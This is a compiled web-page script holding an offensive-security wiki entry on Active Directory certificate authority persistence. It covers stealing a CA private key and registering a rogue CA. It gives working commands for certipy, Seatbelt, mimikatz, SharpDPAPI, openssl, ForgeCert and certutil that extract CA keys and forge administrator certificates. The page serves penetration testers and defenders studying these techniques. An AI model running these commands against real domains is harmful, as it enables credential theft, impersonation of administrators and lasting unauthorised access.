import{_ as o,c,a5 as l,G as s,w as a,B as h,o as p,j as e,a as i}from"./chunks/framework.B5CpDqM0.js";const b=JSON.parse('{"title":"Certificate authority","description":"","frontmatter":{"authors":"ShutdownRepo"},"headers":[],"relativePath":"ad/persistence/adcs/certificate-authority.md","filePath":"ad/persistence/adcs/certificate-authority.md","lastUpdated":1724982529000}'),k={name:"ad/persistence/adcs/certificate-authority.md"};function d(g,t,u,C,y,F){const r=h("PluginTabsTab"),n=h("PluginTabs");return p(),c("div",null,[t[2]||(t[2]=l('<h1 id="certificate-authority" tabindex="-1">Certificate authority <a class="header-anchor" href="#certificate-authority" aria-label="Permalink to &quot;Certificate authority&quot;">​</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">​</a></h2><p>In <a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2" target="_blank" rel="noreferrer">their research papers</a>, <a href="https://twitter.com/harmj0y" target="_blank" rel="noreferrer">Will Schroeder</a> and <a href="https://twitter.com/tifkin_" target="_blank" rel="noreferrer">Lee Christensen</a> identified 2 domain persistence techniques relying on the role of the Certificate Authority within a PKI.</p><ul><li>Forging certificates with a stolen CA certificates (DPERSIST1)</li><li>Trusting rogue CA certificates (DPERSIST2)</li></ul><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">​</a></h2><h3 id="stolen-ca" tabindex="-1">Stolen CA <a class="header-anchor" href="#stolen-ca" aria-label="Permalink to &quot;Stolen CA&quot;">​</a></h3><blockquote><p>The Enterprise CA has a certificate and associated private key that exist on the CA server itself. (<a href="https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf" target="_blank" rel="noreferrer">Certified_Pre-Owned.pdf</a>)</p></blockquote><p>If an attacker obtains control over a CA server, he may be able to retrieve the private key associated with the CA cert, and use that private key to generate and sign client certificates. This means he could forge (and sign) certificate to authenticate as a powerful user for example.</p>',8)),s(n,null,{default:a(()=>[s(r,{label:"UNIX-like"},{default:a(()=>t[0]||(t[0]=[e("p",null,[i("Extracting the DPAPI-protected CA cert private key can be done remotely from UNIX-like systems with "),e("a",{href:"https://github.com/ly4k/Certipy",target:"_blank",rel:"noreferrer"},"Certipy"),i(" (Python).")],-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"certipy"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," ca"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -backup"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -ca"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "CA"'),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -username"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "USER@domain.local"'),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -password"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "PASSWORD"'),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -dc-ip"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "DC-IP"')])])])],-1),e("p",null,"Then, forging (and signing) a certificate can be done as follows.",-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"certipy"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," forge"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -ca-pfx"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "CA.pfx"'),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -upn"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "administrator@corp.local"'),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -subject"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "CN=Administrator,CN=Users,DC=CORP,DC=LOCAL"')])])])],-1),e("p",null,[i("The certificate can then be used with "),e("a",{href:"./../../movement/kerberos/pass-the-certificate"},"Pass the Certificate"),i(".")],-1)])),_:1}),s(r,{label:"Windows"},{default:a(()=>t[1]||(t[1]=[e("p",null,[i("Extracting the DPAPI-protected CA cert private key can be done remotely with "),e("a",{href:"https://github.com/GhostPack/Seatbelt",target:"_blank",rel:"noreferrer"},"Seatbelt"),i(" (C#).")],-1),e("div",{class:"language-powershell vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"powershell"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Seatbelt.exe"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," Certificates "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"computername"),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"ca.domain.local"')])])])],-1),e("p",null,[i("Alternatively, the builtin "),e("code",null,"certsrv.msc"),i(" utility can be used locally on the CA server.")],-1),e("div",{class:"language- vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"}),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",null,'Win+R > certsrv.msc > CA > right click > All Tasks > Back up CA... > selet "Private key and CA certificate" > Next')])])])],-1),e("p",null,[i("Alternatively, "),e("a",{href:"https://github.com/gentilkiwi/mimikatz",target:"_blank",rel:"noreferrer"},"Mimikatz"),i(" (C) can also be used for that purpose, locally.")],-1),e("div",{class:"language-powershell vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"powershell"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"mimikatz.exe"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "crypto::capi"'),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "crypto::cng"'),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "crypto::certificates /export"')])])])],-1),e("p",null,[i("Alternatively, "),e("a",{href:"https://github.com/GhostPack/SharpDPAPI",target:"_blank",rel:"noreferrer"},"SharpDPAPI"),i(" (C#) can be used for that purpose, locally, along with "),e("a",{href:"https://www.openssl.org/",target:"_blank",rel:"noreferrer"},"openssl"),i(" to transform the PEM into a usable PFX.")],-1),e("div",{class:"language-powershell vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"powershell"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"SharpDPAPI.exe"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," certificates "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"machine")])])])],-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"openssl"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," pkcs12"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -in"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "ca.pem"'),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -keyex"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -CSP"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "Microsoft Enhanced')]),i(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'Cryptographic Provider v1.0"'),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -export"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -out"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "ca.pfx"')])])])],-1),e("p",null,[i("Then, forging and signing a certificate can be done with "),e("a",{href:"https://github.com/GhostPack/ForgeCert",target:"_blank",rel:"noreferrer"},"ForgeCert"),i(" (C#).")],-1),e("div",{class:"language-powershell vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"powershell"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"ForgeCert.exe"),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," --"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"CaCertPath "),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"ca.pfx"'),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," --"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"CaCertPassword "),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"Password"'),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," --"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Subject "),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"CN=User"'),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," --"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"SubjectAltName "),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"administrator@domain.local"'),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," --"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"NewCertPath "),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"administrator.pfx"'),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," --"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"NewCertPassword "),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"Password"')])])])],-1)])),_:1})]),_:1}),t[3]||(t[3]=l('<h3 id="rogue-ca" tabindex="-1">Rogue CA <a class="header-anchor" href="#rogue-ca" aria-label="Permalink to &quot;Rogue CA&quot;">​</a></h3><div class="warning custom-block"><p></p><blockquote><p>it is usually preferable for an attacker to steal the existing CA certificate instead of installing an additional rogue CA certificate (<a href="https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf" target="_blank" rel="noreferrer">Certified_Pre-Owned.pdf</a>)</p></blockquote></div><p>An attacker with sufficient privileges in the domain can setup a rogue CA and make the domain&#39;s resources trust it. Once the rogue CA is trusted, the attacker can forge and sign client certificates.</p><p>In order to register the rogue CA, the self-signed CA cert must be added to the <code>NTAuthCertificates</code> object&#39;s <code>cacertificate</code> attribute, and in the <code>RootCA</code> directory services store.</p><p>Registering the rogue CA can be done remotely with the <code>certutil.exe</code> utility from Windows systems.</p><div class="language-batch vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">batch</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">certutil.exe -dspublish -f </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;C:\\Temp\\CERT.crt&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> NTAuthCA</span></span></code></pre></div><p>Once this is done, a certificate can be forged, signed and used as explained above: <a href="./certificate-authority#stolen-ca">#stolen-ca</a></p><h2 id="resources" tabindex="-1">Resources <a class="header-anchor" href="#resources" aria-label="Permalink to &quot;Resources&quot;">​</a></h2><p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2" target="_blank" rel="noreferrer">https://posts.specterops.io/certified-pre-owned-d95910965cd2</a></p>',9))])}const m=o(k,[["render",d]]);export{b as __pageData,m as default};
